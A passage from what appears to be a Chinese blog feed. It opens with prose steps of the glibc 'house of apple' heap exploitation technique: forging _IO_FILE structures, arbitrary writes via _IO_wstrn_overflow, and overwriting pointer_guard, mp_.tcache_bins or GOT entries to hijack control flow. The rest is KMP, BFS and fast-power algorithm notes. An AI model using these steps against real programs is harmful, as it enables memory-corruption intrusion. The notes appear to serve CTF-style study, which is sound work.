bin</code>的分配</li><li>第二个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_str_overflow</code>中的<code>malloc</code>函数任意地址分配，并使用<code>memcpy</code>使得能够<strong>任意地址写任意值</strong></li><li>利用两次任意地址写任意值修改<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>的值绕过<code>_IO_vtable_check</code>函数的检测（或者利用一次任意地址写任意值修改<code>libc.got</code>里面的函数地址，很多<code>IO</code>流函数调用<code>strlen/strcpy/memcpy/memset</code>等都会调到<code>libc.got</code>里面的函数）</li><li>利用一个<code>_IO_FILE</code>，随意伪造<code>vtable</code>劫持程序控制流即可</li></ul><h3 id="思路二：劫持mp-结构体"><a href="#思路二：劫持mp-结构体" class="headerlink" title="思路二：劫持mp__结构体"></a>思路二：劫持mp__结构体</h3><p>该思路与上述思路差不多，不过对<code>tcachebin</code>分配的劫持是通过修改<code>mp_.tcache_bins</code>这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为线程全局变量、<code>tls</code>结构体的地址本地和远程并不一定是一样的，有时需要爆破。</p><p>利用步骤如下：</p><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理</li><li>接下来的过程与上面的思路是一样的</li></ul><h3 id="思路三：利用house-of-emma"><a href="#思路三：利用house-of-emma" class="headerlink" title="思路三：利用house_of_emma"></a>思路三：利用house_of_emma</h3><p>该思路其实就是<code>house of apple + house of emma</code>。</p><p>利用步骤如下：</p><ul><li>伪造两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值</li><li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>利用即可控制程序执行流</li></ul><h3 id="思路四：利用house-of-corrision"><a href="#思路四：利用house-of-corrision" class="headerlink" title="思路四：利用house_of_corrision"></a>思路四：利用house_of_corrision</h3><p>这个思路也很灵活，修改掉这个变量后，直接释放超大的<code>chunk</code>，去覆盖掉<code>point_guard</code>或者<code>tcache</code>变量。我称之为<code>house of apple + house of corrision</code>。</p><p>利用过程与前面也基本是大同小异，就不在此详述了。</p><p>其实也有其他的思路，比如还可以劫持<code>main_arena</code>，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造<code>_IO_FILE</code>结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。</p>]]></content>
      
      
      
        <tags>
            
            <tag> glibc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2023/11/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/11/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h1><h2 id="模板1"><a href="#模板1" class="headerlink" title="模板1"></a>模板1</h2><p>很多人有不同的KMP的写法，真的很容易看晕，我这里参考的是 <a href="https://zhuanlan.zhihu.com/p/83334559">KMP 算法详解 - 知乎 (zhihu.com)</a></p><p>本文做了如下约定</p><blockquote><p>pat代表模式串，长度为M，txt表示文本串，长度为N，KMP用于在txt中查找pat</p></blockquote><p>这里采用了动态规划的思想，先看查找部分的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">int</span> <span class="title">search</span><span class="params">(String txt)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> M = pat.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">int</span> N = txt.<span class="built_in">length</span>();</span><br><span class="line">    <span class="comment">// pat 的初始态为 0</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="comment">// 当前是状态 j，遇到字符 txt[i]，</span></span><br><span class="line">        <span class="comment">// pat 应该转移到哪个状态？</span></span><br><span class="line">        j = dp[j][txt.<span class="built_in">charAt</span>(i)];</span><br><span class="line">        <span class="comment">// 如果达到终止态，返回匹配开头的索引</span></span><br><span class="line">        <span class="keyword">if</span> (j == M) <span class="keyword">return</span> i - M + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没到达终止态，匹配失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释如下：</p><blockquote><p>这里 <code>dp[i][j]</code> 的含义是匹配到了pat的第i个，这里采用滑动pat的方法</p></blockquote><p>那么问题就转移到我们应该如何求dp数组，也就是针对pat，我们要枚举出所有的情况。有如下的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KMP</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[][] dp;</span><br><span class="line">    <span class="keyword">private</span> String pat;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">KMP</span><span class="params">(String pat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pat = pat;</span><br><span class="line">        <span class="type">int</span> M = pat.<span class="built_in">length</span>();</span><br><span class="line">        <span class="comment">// dp[状态][字符] = 下个状态</span></span><br><span class="line">        dp = <span class="keyword">new</span> <span class="type">int</span>[M][<span class="number">256</span>];</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">        dp[<span class="number">0</span>][pat.<span class="built_in">charAt</span>(<span class="number">0</span>)] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 影子状态 X 初始为 0</span></span><br><span class="line">        <span class="type">int</span> X = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 当前状态 j 从 1 开始</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; M; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">256</span>; c++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pat.<span class="built_in">charAt</span>(j) == c) </span><br><span class="line">                    dp[j][c] = j + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    dp[j][c] = dp[X][c];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新影子状态</span></span><br><span class="line">            X = dp[X][pat.<span class="built_in">charAt</span>(j)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">int</span> <span class="title">search</span><span class="params">(String txt)</span> </span>&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释如下：</p><ol><li><p>首先，定义两个状态：</p><ol><li>状态前进：遇到了符合pat的字符，进一步匹配下一个</li><li>状态重启：遇到了不符合的状态，状态需要进行回退或者重启</li></ol></li><li><p>如何确定在哪个状态重启？</p><ol><li><p>这里引入一个新的变量X，叫做影子状态。该状态和当前状态具有相同的前缀和，比如：</p><blockquote><p>假设pat为：ABABC，此刻我们在状态3，那么X应该指向状态1，此时他们有共同的前缀。</p></blockquote></li><li><p>如果此时j遇到了一个无法处理的变量，比如遇到了一个A，期望的变量是C，那么就把A丢给影子变量处理，影子状态遇到A的时候会跳到状态2，所以在状态3如果碰到了A，就会跳去状态2</p></li></ol></li><li><p>更新X的位置</p><ol><li><p>遍历了所有可能遇到的字符之后，我们要更新X的位置，前面说了，X和j具有最长的公共前缀，所以X的更新就应该是X向后刺探是否能更进一步到达j，比如上面的例子</p><blockquote><p>ABABC，在X没更新前，X在1，j在3。结束时j一定会++，所以我们为了让X保持和j是最长的公共前缀和，X就会尝试是否可以到达j的位置，进一步拥有更长的前缀</p></blockquote></li></ol></li></ol><h2 id="模板2"><a href="#模板2" class="headerlink" title="模板2"></a>模板2</h2><p>上面的模板对于求位置来说好理解一点，但是洛谷的模板题要求出border的长度，我觉得还是传统的KMP好一点，因为一起看容易混乱，所以这里写了 两个模板</p><p><a href="https://www.bilibili.com/video/BV1AY4y157yL/?spm_id_from=333.337.search-card.all.click&vd_source=4e2c3d81567e27febdf9ee543a026cd0">最浅显易懂的 KMP 算法讲解_哔哩哔哩_bilibili</a></p><p>说真的看了next数组的版本我觉得上面的就是依托（x</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 10000000</span></span><br><span class="line"><span class="type">int</span> next_arr[N];</span><br><span class="line"><span class="type">char</span> txt[N];</span><br><span class="line"><span class="type">char</span> patt[N];</span><br><span class="line"><span class="type">int</span> txt_len, patt_len;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calc_next</span><span class="params">()</span></span>&#123;</span><br><span class="line">    next_arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> next_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> prefix_len = <span class="number">0</span>; <span class="comment">//current_same_len</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; patt_len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(patt[prefix_len] == patt[i])&#123;</span><br><span class="line">            next_arr[++next_idx] = ++prefix_len;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(prefix_len == <span class="number">0</span>)&#123;</span><br><span class="line">                next_arr[++next_idx] = <span class="number">0</span>;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                prefix_len = next_arr[prefix_len - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kmp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> patt_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> txt_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(txt_idx &lt; txt_len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(txt[txt_idx] == patt[patt_idx])&#123;</span><br><span class="line">            patt_idx++, txt_idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(patt_idx &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            patt_idx = next_arr[patt_idx - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            txt_idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(patt_idx == patt_len)&#123;</span><br><span class="line">            cout &lt;&lt; txt_idx - patt_len + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; patt_len; i++)&#123;</span><br><span class="line">        cout &lt;&lt; next_arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; txt &gt;&gt; patt;</span><br><span class="line">    txt_len = <span class="built_in">strlen</span>(txt);</span><br><span class="line">    patt_len = <span class="built_in">strlen</span>(patt);</span><br><span class="line">    <span class="built_in">calc_next</span>();</span><br><span class="line">    <span class="built_in">kmp</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="洛谷P1032"><a href="#洛谷P1032" class="headerlink" title="洛谷P1032"></a>洛谷P1032</h2><p>改了很久…，错了一个很小的点，感谢池佬打完icpc帮我改了出来</p><p>这里用上了刚学的bfs搜索，利用kmp匹配就可以了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 40</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    string data;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line">    <span class="built_in">Node</span>(string _data, <span class="type">int</span> _depth):<span class="built_in">data</span>(_data),<span class="built_in">depth</span>(_depth)&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">string replace_patt[N];</span><br><span class="line">string replace_content[N];</span><br><span class="line">string origin_content;</span><br><span class="line">string string_wanted;</span><br><span class="line">string tmp;</span><br><span class="line"><span class="type">int</span> operate_idx;</span><br><span class="line"><span class="type">int</span> next_arr[N][N];</span><br><span class="line">queue&lt;Node&gt; q;</span><br><span class="line">set&lt;string&gt; ss;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_next</span><span class="params">(string patt, <span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    next_arr[idx][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> patt_len = patt.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">int</span> prefix_len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> next_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; patt_len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(patt[prefix_len] == patt[i])&#123;</span><br><span class="line">            next_arr[idx][++next_idx] = ++prefix_len;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(prefix_len == <span class="number">0</span>)&#123;</span><br><span class="line">                next_arr[idx][++next_idx] = <span class="number">0</span>;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                prefix_len = next_arr[idx][prefix_len - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kmp</span><span class="params">(string con, <span class="type">int</span> idx, <span class="type">int</span> now_step)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> con_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pat_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> con_len = con.<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">int</span> pat_len = replace_patt[idx].<span class="built_in">length</span>();</span><br><span class="line">    <span class="type">bool</span> have_replace = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(con_idx &lt; con_len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(con[con_idx] == replace_patt[idx][pat_idx])&#123;</span><br><span class="line">            con_idx++, pat_idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pat_idx &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            pat_idx = next_arr[idx][pat_idx - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con_idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(con_idx &gt; con_len)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(pat_idx == pat_len)&#123;</span><br><span class="line">            tmp = con;</span><br><span class="line">            <span class="comment">//tmp = con.substr(0, con_idx - pat_idx + 1) + replace_content[idx] + con.substr(con_idx, con_len);</span></span><br><span class="line">            tmp.<span class="built_in">replace</span>(con_idx - pat_len, pat_len, replace_content[idx]);</span><br><span class="line">            <span class="comment">//cout &lt;&lt; now_step + 1 &lt;&lt; &quot; &quot;&lt;&lt; tmp &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span>(!ss.<span class="built_in">count</span>(tmp))</span><br><span class="line">                q.<span class="built_in">push</span>(<span class="built_in">Node</span>(tmp, now_step + <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ss.<span class="built_in">insert</span>(tmp);</span><br><span class="line">            pat_idx = next_arr[idx][pat_idx - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; origin_content &gt;&gt; string_wanted;</span><br><span class="line">    string tmp1, tmp2;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; tmp1 &gt;&gt; tmp2)&#123;</span><br><span class="line">        replace_patt[operate_idx] = tmp1;</span><br><span class="line">        replace_content[operate_idx] = tmp2;</span><br><span class="line">        <span class="built_in">get_next</span>(replace_patt[operate_idx], operate_idx);</span><br><span class="line">        operate_idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="built_in">Node</span>(origin_content, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        Node curr = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(ss.<span class="built_in">count</span>(curr.data))<span class="keyword">continue</span>;</span><br><span class="line">        ss.<span class="built_in">insert</span>(curr.data);</span><br><span class="line">        <span class="keyword">if</span>(curr.depth &gt; <span class="number">10</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO ANSWER!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(curr.data == string_wanted)&#123;</span><br><span class="line">            cout &lt;&lt; curr.depth;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; operate_idx; i++)&#123;</span><br><span class="line">            <span class="built_in">kmp</span>(curr.data, i, curr.depth);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO ANSWER!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h1><p><a href="https://zhuanlan.zhihu.com/p/95902286">算法学习笔记(4)：快速幂 - 知乎 (zhihu.com)</a></p><p>让我们先来思考一个问题：<strong>7的10次方，怎样算比较快？</strong></p><p><strong>方法1：</strong>最朴素的想法，7<em>7&#x3D;49，49</em>7&#x3D;343，… 一步一步算，共进行了<strong>9次</strong>乘法。</p><p>这样算无疑太慢了，尤其对计算机的CPU而言，每次运算只乘上一个个位数，无疑太屈才了。这时我们想到，也许可以拆分问题。</p><p><strong>方法2：</strong>先算7的5次方，即7<em>7</em>7<em>7</em>7，再算它的平方，共进行了<strong>5次</strong>乘法。</p><p>但这并不是最优解，因为对于“7的5次方”，我们仍然可以拆分问题。</p><p><strong>方法3：</strong>先算7<em>7得49，则7的5次方为49</em>49*7，再算它的平方，共进行了<strong>4次</strong>乘法。</p><p>模仿这样的过程，我们得到一个在 �(log⁡�) 时间内计算出幂的算法，也就是快速幂。</p><h2 id="递归快速幂"><a href="#递归快速幂" class="headerlink" title="递归快速幂"></a>递归快速幂</h2><p>计算a的n次方，如果n是偶数（不为0），那么就<strong>先计算a的n&#x2F;2次方，然后平方</strong>；如果n是奇数，那么就<strong>先计算a的n-1次方，再乘上a</strong>；递归出口是<strong>a的0次方为1</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归快速幂</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qpow</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">qpow</span>(a, n - <span class="number">1</span>) * a;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> temp = <span class="built_in">qpow</span>(a, n / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> temp * temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际大部分要求取模，并且要使用ll</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归快速幂（对大素数取模）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="function">ll <span class="title">qpow</span><span class="params">(ll a, ll n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">qpow</span>(a, n - <span class="number">1</span>) * a % MOD;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ll temp = <span class="built_in">qpow</span>(a, n / <span class="number">2</span>) % MOD;</span><br><span class="line">        <span class="keyword">return</span> temp * temp % MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于递归会造成额外的函数调用的消耗，也有非递归版本的</p><h2 id="非递归快速幂"><a href="#非递归快速幂" class="headerlink" title="非递归快速幂"></a>非递归快速幂</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非递归快速幂</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qpow</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)        <span class="comment">//如果n的当前末位为1</span></span><br><span class="line">            ans *= a;  <span class="comment">//ans乘上当前的a</span></span><br><span class="line">        a *= a;        <span class="comment">//a自乘</span></span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;       <span class="comment">//n往右移一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速幂的拓展"><a href="#快速幂的拓展" class="headerlink" 